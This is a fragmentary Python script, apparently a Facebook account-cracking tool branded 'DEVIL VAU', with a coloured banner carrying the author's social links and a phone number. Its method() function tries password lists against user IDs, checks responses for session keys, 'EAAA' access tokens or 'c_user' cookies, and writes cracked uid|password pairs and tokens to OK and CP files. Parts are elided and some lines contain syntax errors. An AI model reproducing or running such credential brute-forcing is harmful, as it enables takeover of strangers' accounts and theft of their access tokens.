...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 DEVIL VAU 🔥].  ║

\x1b[0;33m║       #TOOL AUTHOR [DEVILVAU] RUMAN [MY ASSITEN]. ║
...
\x1b[0;33m║#YOUTUBE : https://www.youtube.com/channel/UCbQKd_EfQejoLiDxR71quXg.  ║

\x1b[0;33m║#FACEBOOK : NAME [MD Ariyan ].       ║

\x1b[0;33m║#GITHUB : https://github.com/HACKERBOYDEVILYT.   ║

\x1b[0;33m║#WHATSAPP : 01981442821.                   ║
...
def menu():
	...
	elif DEVIL == "1" or YO YO == "01":

		publik()

		method()

	elif DEVIL == "2" or YO YO == "02":

		follower()

		method()

	elif DEVIL == "3" or  YO YO == "03":

		massal()

		method()

	elif YO YO == "4" or DEVIL == "04":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mNAIM PRO/FASTER \033[1;97m]")
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[DEVIL-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tDEVIL),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;95m[DEVIL-CP] %s|%s\033[0;92m        "%(uid, pw))

				cp.append("%s|%s"%(uid, pw))

				open("CP/%s.txt"%(tDEVIL),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[DEVIL-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[FLAME-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[NA1M-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[FLAME-CP] %s|%s\033[0;91m        "%(uid, pw))
